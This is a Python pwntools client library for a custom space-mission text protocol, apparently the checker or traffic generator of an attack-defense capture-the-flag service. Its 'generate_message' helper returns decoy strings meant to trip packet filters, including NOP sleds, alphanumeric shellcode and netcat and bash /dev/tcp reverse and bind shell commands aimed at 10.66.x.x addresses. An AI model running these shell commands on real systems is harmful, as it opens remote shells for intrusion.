import logging
import random
import os
import base64
from time import time
import string
import pwn
from collections import namedtuple

MessageHeader = namedtuple('MessageHeader', ['num_lines', 'req_type', 'time', 'subject', 'mode', 'subrequests'])
BeingDescriptor = namedtuple('BeingDescriptor', ['id', 'name', 'age', 'remaining_lives', 'affiliation', 'crew_id', 'diseases', 'skills'])
CrewDescriptor = namedtuple('CrewDescriptor', ['id', 'name', 'captain', 'allowance', 'equipment', 'invited'])
IdentityHeader = namedtuple('IdentityHeader', ['id', 'name', 'auth'])
MissionDescriptor = namedtuple('MissionDescriptor', ['id', 'name', 'milestones', 'spaceships', 'planets', 'deadline', 'sponsor', 'rewards', 'overseer'])
SpaceshipDescriptor = namedtuple('SpaceshipDescriptor', ['id', 'name', 'position', 'fuel', 'max_speed', 'tuv', 'manufacturer', 'crew', 'resources', 'capacity', 'janitor'])

def generate_message():
    "returns a string that hopefully triggers some packet filtering"

    return random.choice([
        os.urandom(random.randint(4, 128)).hex(),
	base64.b64encode(os.urandom(random.randint(4, 128))).decode(),
  	'A' * random.randint(4, 16),
	'B' * random.randint(4, 16),
        "\x90" * random.randint(4, 16),
        r"TX-3399-Purr-!TTTP\%JONE%501:-%mm4-%mm%--DW%P-Yf1Y-fwfY-yzSzP-iii%-Zkx%-%Fw%P-XXn6- 99w%-ptt%P-%w%%-qqqq-jPiXP-cccc-Dw0D-WICzP-c66c-W0TmP-TTTT-%NN0-%o42-7a-0P-xGGx-rrrx- aFOwP-pApA-N-w--B2H2PPPPPPPPPPPPPPPPPPPPPP",
	'Never gonna give you up, never gonna let you down',
      	'/bin/sh -c "/bin/{} -l -p {} -e /bin/sh"'.format(random.choice(['nc', 'ncat', 'netcat']), random.randint(1024, 65535)),
	'/bin/sh -c "/bin/{} -e /bin/sh 10.66.{}.{} {}"'.format(random.choice(['nc', 'ncat', 'netcat']), random.randint(1024, 65535), random.randint(0,255), random.randint(0,255), random.randint(1024, 65535)),
	'/bin/bash -i >& /dev/tcp/10.66.{}.{}/{} 0>&1'.format(random.randint(0,255), random.randint(0,255), random.randint(1024, 65535)),
    ])


def connection_or_fail(ip, port):
    try:
        return pwn.connect(ip, port)
    except:
        return None
        

def generate_unique_uname(prefix = "", min = 8, max = 32):
    return prefix + ''.join(random.choices(string.ascii_letters, k=random.randint(min, max)))


def generate_random_imc_array():
    return ''.join([f"^{generate_unique_uname()}^" for _ in range(random.randint(4, 8))])


def generate_random_str_array():
    return [generate_unique_uname() for _ in range(random.randint(4, 8))]


def generate_random_int_array():
    return [random.randint(5,67) for _ in range(random.randint(4, 8))]

# ############################################
# send
# ############################################


def send_msg_header(p:pwn.connect, msh: MessageHeader):
    res: str = f"TVNI|{msh.num_lines}|{msh.req_type}|^{msh.time}^|{msh.subject}|{msh.mode}|"
    for item in msh.subrequests:
        res += f"^{item}^"
    p.sendline(res.encode())


def send_identity_header(p:pwn.connect, idh: IdentityHeader):
    res: str = f"SURI|{idh.id}|{idh.name}|{idh.auth}"
    p.sendline(res.encode())


def send_being_descriptor(p:pwn.connect, bdr: BeingDescriptor):
    bdr_list: str = f"QkRS|{bdr.id}|{bdr.name}|{bdr.age}|{bdr.remaining_lives}|{bdr.affiliation}|{bdr.crew_id}|"
    if bdr.diseases:
        for item in bdr.diseases:
            bdr_list += f"^{item}^"
    bdr_list += "|"
    if bdr.skills:
        for item in bdr.skills:
            bdr_list += f"^{item}^"
    p.sendline(bdr_list.encode())


def send_crew_descriptor(p:pwn.connect, cdr: CrewDescriptor):
    res: str = f"Q0RS|{cdr.id}|{cdr.name}|{cdr.captain}|{cdr.allowance}|"
    if cdr.equipment:
        for item in cdr.equipment:
            res += f"^{item}^"
    p.sendline(res.encode())


def send_mission_descriptor(p:pwn.connect, mdr: MissionDescriptor):
    res = f"TVNE|{mdr.id}|{mdr.name}|"
    if mdr.milestones:
        for item in mdr.milestones:
            res += f"^{item}^"
    res += "|"
    if mdr.spaceships:
        for item in mdr.spaceships:
            res += f"^{item}^"
    res += "|"
    if mdr.planets:
        for item in mdr.planets:
            res += f"^{item}^"
    if not mdr.sponsor:
        res += f"|{mdr.deadline}||"
    else:
        res += f"|{mdr.deadline}|{mdr.sponsor}|"
    if mdr.rewards:
        for item in mdr.rewards:
            res += f"^{item}^"
    res += f"|{mdr.overseer}"
    p.sendline(res.encode())


def send_spaceship_descriptor(p:pwn.connect, sdr: SpaceshipDescriptor):
    res = f"U0RS|{sdr.id}|{sdr.name}|{sdr.position}|{sdr.fuel}|{sdr.max_speed}|{sdr.tuv}|{sdr.manufacturer}|"
    if not sdr.crew:
        res += "|"
    else:
        res += f"{sdr.crew}|"
    if sdr.resources:
        for item in sdr.resources:
            res += f"^{item}^"
    res += f"|{sdr.capacity}|"
    if sdr.janitor:
        res += f"{sdr.janitor}"
    p.sendline(res.encode())

# ############################################
# parse
# ############################################


def parse_msh(msh: bytes):
    msh_list: list[bytes] = msh.split(b"|")
    if msh_list[0] != b"TVNI":
        logging.error("Expected TVNI got: %s instead", msh)
        return None
    num_lines = int(msh_list[1], 10)
    if msh_list[5] != b"RESPONSE":
        logging.error("Expected RESPONSE, got: %s instead", msh)
        return None
    return MessageHeader(num_lines, msh_list[2].decode(), msh_list[3].decode(), msh_list[4].decode(), msh_list[5].decode(), msh_list[6].decode())


def parse_idh(idh: bytes):
    idh_list: list[str] = idh.decode().split("|")
    if idh_list[0] != "SURI":
        logging.error("Expected SURI got: %s instead", idh)
        return None
    # id name auth
    return IdentityHeader(idh_list[1], idh_list[2], idh_list[3])


def parse_bdr(bdr: bytes) -> BeingDescriptor | None:
    bdr_list: list[bytes] = bdr.split(b"|")
    if bdr_list[0] != b"QkRS":
        logging.error("Expected QkRS got: %s instead", bdr)
        return None
    id = int(bdr_list[1], 10)
    name = bdr_list[2]
    age = int(bdr_list[3], 10)
    remaining_lives = int(bdr_list[4], 10)
    affiliation = bdr_list[5]
    crew_id = bdr_list[6]
    if crew_id != b"null" and crew_id != b"":
        crew_id = int(crew_id, 10)
    # TODO parse diseases
    # TODO parse skills
    return BeingDescriptor(id, name.decode(), age, remaining_lives, affiliation.decode(), crew_id, bdr_list[7].decode(), bdr_list[8].decode())


def parse_cdr(cdr: bytes):
    cdr_list: list[bytes] = cdr.split(b"|")
    if cdr_list[0] != b"Q0RS":
        logging.error("Expected Q0RS got: %s instead", cdr)
        return None
    id = int(cdr_list[1], 10)
    name = cdr_list[2]
    captain = cdr_list[3]
    allowance = int(cdr_list[4], 10)
    equipment = cdr_list[5]
    invited = cdr_list[6]
    # invited = b""
    # TODO parse equipment
    return CrewDescriptor(id, name.decode(), captain.decode(), allowance, equipment, invited.decode())


def parse_mdr(mdr: bytes):
    mdr_list: list[bytes] = mdr.split(b"|")
    if mdr_list[0] != b"TVNE":
        logging.error("Expected TVNE got: %s instead", mdr)
        return None
    id = int(mdr_list[1], 10)
    name = mdr_list[2].decode()
    milestones = mdr_list[3].decode()
    spaceships = mdr_list[4].decode()
    planets = mdr_list[5].decode()
    deadline = int(mdr_list[6], 10)
    sponsor = int(mdr_list[7], 10)
    rewards = mdr_list[8].decode()
    overseer = int(mdr_list[9], 10)
    # TODO parse equipment
    return MissionDescriptor(id, name, milestones, spaceships, planets, deadline, sponsor, rewards, overseer)


def parse_sdr(sdr: bytes):
    sdr_list: list[bytes] = sdr.split(b"|")
    if sdr_list[0] != b"U0RS":
        logging.error("Expected U0RS got: %s instead", sdr)
        return None
    id = int(sdr_list[1], 10)
    name = sdr_list[2].decode()
    position = sdr_list[3].decode()
    fuel = int(sdr_list[4], 10)
    max_speed = int(sdr_list[5], 10)
    tuv = sdr_list[6].decode()
    manufacturer = sdr_list[7].decode()
    crew = sdr_list[8].decode()
    resources = sdr_list[9].decode()
    capacity = int(sdr_list[10], 10)
    if len(sdr_list[11]) > 0:
        janitor = int(sdr_list[11], 10)
    else:
        janitor = None
    # TODO parse resources?
    return SpaceshipDescriptor(id, name, position, fuel, max_speed, tuv, manufacturer, crew, resources, capacity, janitor)

# ############################################
# create
# ############################################

def create_crew(p: pwn.connect, idh: IdentityHeader | None, crew_name: str = generate_unique_uname(), captain: int | None = None, allowance: str = str(random.randint(10, 1999999)), equipment: list | None = generate_random_str_array(), invited: list[str] = generate_random_str_array()):
    if not idh:
        raise ValueError("auth needed")
    send_msg_header(p, MessageHeader(2, "CREATE", int(time()), "CREW", "REQUEST", []))
    send_identity_header(p, idh)
    send_crew_descriptor(p, CrewDescriptor("", crew_name, captain, allowance, equipment, invited))
    msh = parse_msh(p.recvline().rstrip())
    if msh == None:
        return (None, None)
    (num_lines, req_type, t, subject, mode, subrequests) = msh
    read = 1
    lines = []
    while read <= num_lines:
        lines.append(p.recvline().rstrip())
        read += 1
    if len(lines) < 2:
        logging.info("Create_crew expected 2 or more lines but got %d instead", len(lines))
        return (None, None)
    idh = parse_idh(lines[0])
    logging.info(idh)
    cdr = parse_cdr(lines[1])
    if cdr == -1:
        cdr = None
    logging.info(cdr)
    return (idh, cdr)


def create_mission(p:pwn.connect, idh: IdentityHeader | None, name: str = generate_unique_uname(), milestones: list[int] | None = generate_random_int_array(), spaceships: list[int] | None = generate_random_int_array(), planets: list[int] | None = generate_random_int_array(), deadline: int = random.randint(1,234), sponsor: int | None = None, rewards: list[str] | None = generate_random_str_array(), overseer: int = 0):
    if not idh:
        raise ValueError("auth needed")
    send_msg_header(p, MessageHeader(2, "CREATE", int(time()), "MISSION", "REQUEST", []))
    send_identity_header(p, idh)
    send_mission_descriptor(p, MissionDescriptor("", name, milestones, spaceships, planets, deadline, sponsor, rewards, overseer))
    msh = parse_msh(p.recvline().rstrip())
    if msh == None:
        return (None, None)
    (num_lines, req_type, t, subject, mode, subrequests) = msh
    read = 1
    lines = []
    while read <= num_lines:
        lines.append(p.recvline().rstrip())
        read += 1
    if len(lines) < 2:
        logging.info("Create_mission expected 2 or more lines but got %d instead", len(lines))
        return (None, None)
    idh = parse_idh(lines[0])
    logging.info(idh)
    mdr = parse_mdr(lines[1])
    if mdr == -1:
        mdr = None
    return (idh, mdr)


def create_being(p:pwn.connect, name: str = generate_unique_uname(), age: int = random.randint(0, 124123), remaining_lives: int | None = random.randint(0, 124123), affiliation: str | None = generate_unique_uname(), crew_id: int | None = None, diseases: list = generate_random_str_array(), skills: list = generate_random_str_array()) -> tuple[None | IdentityHeader, None | BeingDescriptor]:
    send_msg_header(p, MessageHeader(2, "CREATE", int(time()), "BEING", "REQUEST", []))
    send_identity_header(p, IdentityHeader("", name, ""))
    send_being_descriptor(p, BeingDescriptor(None, name, age, remaining_lives, affiliation, crew_id, diseases, skills))
    msh = parse_msh(p.recvline().rstrip())
    if msh == None:
        return (None, None)
    (num_lines, req_type, t, subject, mode, subrequests) = msh
    read = 1
    lines = []
    while read <= num_lines:
        lines.append(p.recvline().rstrip())
        read += 1
    if len(lines) < 2:
        logging.info("Create_being expected 2 or more lines but got %d instead", len(lines))
        return (None, None)
    idh = parse_idh(lines[0])
    bdr = parse_bdr(lines[1])
    return (idh, bdr)


def create_spaceship(p: pwn.connect, idh: IdentityHeader, s_name: str = generate_unique_uname(), location: str | None = generate_unique_uname(), fuel: int = random.randint(324, 67420), max_speed: int | None = random.randint(324, 67420), tuv: str = generate_unique_uname(), manufacturer: str = generate_unique_uname(), crew: int | None = None, resources: list[str] | None = generate_random_str_array(), capacity: int = random.randint(10, 12442), janitor: int | None = None):
    send_msg_header(p, MessageHeader(2, "CREATE", int(time()), "SPACESHIP", "REQUEST", []))
    send_identity_header(p, idh)
    send_spaceship_descriptor(p, SpaceshipDescriptor("", s_name, location, fuel, max_speed, tuv, manufacturer, crew, resources, capacity, janitor))
    msh = parse_msh(p.recvline().rstrip())
    if msh == None:
        return None
    (num_lines, req_type, t, subject, mode, subrequests) = msh
    read = 1
    lines = []
    while read <= num_lines:
        lines.append(p.recvline().rstrip())
        read += 1
    if len(lines) < 2:
        logging.info("Create_spaceship expected 2 or more lines but got %d instead", len(lines))
        return None
    sdr = None
    tmp = None
    for line in lines:
        e = 0
        if not tmp:
            tmp = parse_idh(line)
            if tmp:
                e = 1
        if not sdr and e == 0:
            sdr = parse_sdr(line)
    return sdr

# ############################################
# fetch
# ############################################


def get_being(p:pwn.connect, id: str, name: str, auth: str) -> tuple[IdentityHeader | None, BeingDescriptor | None]:
    idh, bdrs = fetch_being(p, IdentityHeader(id, name, auth), name=name)
    if not bdrs:
        return (idh, None)
    return (idh, bdrs[0])


def fetch(p: pwn.connect, subject: str, tag: str, fields: list[str], idh: IdentityHeader):
    send_msg_header(p, MessageHeader(2, "FETCH", int(time()), subject, "REQUEST", []))
    send_identity_header(p, idh)
    p.sendline((tag + "|" + "|".join(str(f) for f in fields)).encode())
    msh = parse_msh(p.recvline().rstrip())
    if msh is None:
        return None
    (num_lines, _, _, _, _, _) = msh
    lines = []
    for _ in range(num_lines):
        lines.append(p.recvline().rstrip())
    return lines


def fetch_being(p: pwn.connect, ident, id="", name="", age="", remaining_lives="",
                affiliation="", crew="", diseases="", skills=""):
    lines = fetch(p, "BEING", "QkRS",
                 [id, name, age, remaining_lives, affiliation, crew, diseases, skills], ident)
    if lines == None:
        return (None, None)
    idh = None
    bdr = []
    for line in lines:
        if not idh:
            idh = parse_idh(line)
        elif not bdr:
            bdr.append(parse_bdr(line))
    return (idh, bdr)


def fetch_crew(p: pwn.connect, ident, id="", name="", captain="", allowance="", equipment=""):
    lines = fetch(p, "CREW", "Q0RS",
                 [id, name, captain, allowance, equipment], ident)
    if lines == None:
        return (None, None)
    idh = None
    crews = []
    for line in lines:
        if not idh:
            idh = parse_idh(line)
        elif not crews:
            crews.append(parse_cdr(line))
    return (idh, crews)

def fetch_spaceship(p: pwn.connect, ident, id="", name="", location="", fuel="", max_speed="", tuv="", manufacturer="", crew="", resources="", capacity=""):
    lines = fetch(p, "SPACESHIP", "U0RS",
                 [id, name, location, fuel, max_speed, tuv, manufacturer, crew, resources, capacity], ident)
    if lines == None:
        return (None, None)
    idh = None
    spaceships = []
    for line in lines:
        if not idh:
            idh = parse_idh(line)
        else:
            sdr = parse_sdr(line)
            if sdr:
                spaceships.append(sdr)
    return (idh, spaceships)


# ############################################
# update
# ############################################


def update(p: pwn.connect, subject: str, tag: str, fields: list[str], idh: IdentityHeader):
    send_msg_header(p, MessageHeader(2, "UPDATE", int(time()), subject, "REQUEST", []))
    send_identity_header(p, idh)
    p.sendline((tag + "|" + "|".join(str(f) for f in fields)).encode())
    msh = parse_msh(p.recvline().rstrip())
    if msh is None:
        return None
    (num_lines, _, _, _, _, _) = msh
    lines = []
    for _ in range(num_lines):
        lines.append(p.recvline().rstrip())
    return lines


def update_being(p: pwn.connect, idh: IdentityHeader | None, bdr: BeingDescriptor):
    if not idh:
        raise ValueError("auth needed")
    lines = update(p, "BEING", "QkRS", list(bdr), idh)
    if lines == None:
        return None
    idh = None
    bdr_res = None
    for line in lines:
        if not idh:
            idh = parse_idh(line)
        elif not bdr_res:
            bdr_res = parse_bdr(line)
    if not bdr_res or not idh:
        return None
    return bdr_res


def update_crew(p: pwn.connect, idh: IdentityHeader | None, cdr: CrewDescriptor):
    if not idh:
        raise ValueError("auth needed")
    lines = update(p, "CREW", "Q0RS", list(cdr), idh)
    if lines == None:
        return None
    idh = None
    cdr_res = None
    for line in lines:
        if not idh:
            idh = parse_idh(line)
        elif not cdr_res:
            cdr_res = parse_cdr(line)
    if not cdr_res or not idh:
        return None
    return cdr_res
